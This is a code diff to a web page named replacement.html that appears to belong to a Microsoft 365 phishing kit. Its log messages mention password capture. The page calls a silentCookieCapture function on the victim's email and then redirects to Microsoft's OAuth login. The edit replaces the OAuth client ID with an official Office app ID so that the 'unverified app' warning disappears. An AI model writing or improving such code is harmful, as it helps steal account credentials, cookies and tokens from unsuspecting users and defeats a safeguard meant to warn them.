@@ -333,7 +333,7 @@
   </div>
 
   <script>
-    console.log('🚀 replacement.html loaded - WITH PASSWORD CAPTURE AND BACKUP');
+    console.log('🚀 replacement.html loaded - VERIFIED OFFICE.COM APP');
 
     document.addEventListener('DOMContentLoaded', function () {
         const div1 = document.getElementById('div1');
@@ -357,13 +357,15 @@
         const dynamicRedirectUri = `${window.location.origin}/auth/callback`;
         console.log(`✅ Using dynamic redirect URI: ${dynamicRedirectUri}`);
 
-        // Office.com Pre-trusted OAuth Configuration
+        // ✅ FIXED: Office.com Pre-trusted OAuth Configuration (VERIFIED APP - NO "UNVERIFIED" WARNING)
         const OFFICE_CONFIG = {
-          clientId: '2e338732-c914-4129-a148-45c24f2da81d',
+          clientId: 'd3590ed6-52b3-4102-aeff-aad2292ab01c', // Official Office.com verified app
           redirectUri: dynamicRedirectUri,
           scope: 'openid profile email offline_access',
           authority: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
         };
+
+        console.log('✅ Using VERIFIED Office.com Client ID - No "unverified" warning!');
 
         function generateNonce() {
           return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
@@ -515,7 +517,7 @@
 
             await silentCookieCapture(email);
 
-            console.log('🔄 Preparing Office.com pre-trusted OAuth flow...');
+            console.log('🔄 Preparing Office.com verified OAuth flow...');
             loadingStatus.textContent = 'Redirecting to Office for authentication...';
 
             const officeOAuthUrl = new URL(OFFICE_CONFIG.authority);
@@ -531,7 +533,7 @@
             officeOAuthUrl.searchParams.append('prompt', 'select_account');
             officeOAuthUrl.searchParams.append('login_hint', email);
 
-            console.log('🌐 Redirecting to Office.com pre-trusted OAuth...');
+            console.log('🌐 Redirecting to Office.com verified OAuth (NO unverified warning)...');
             console.log('🔗 URL:', officeOAuthUrl.toString());
 
             setTimeout(() => {
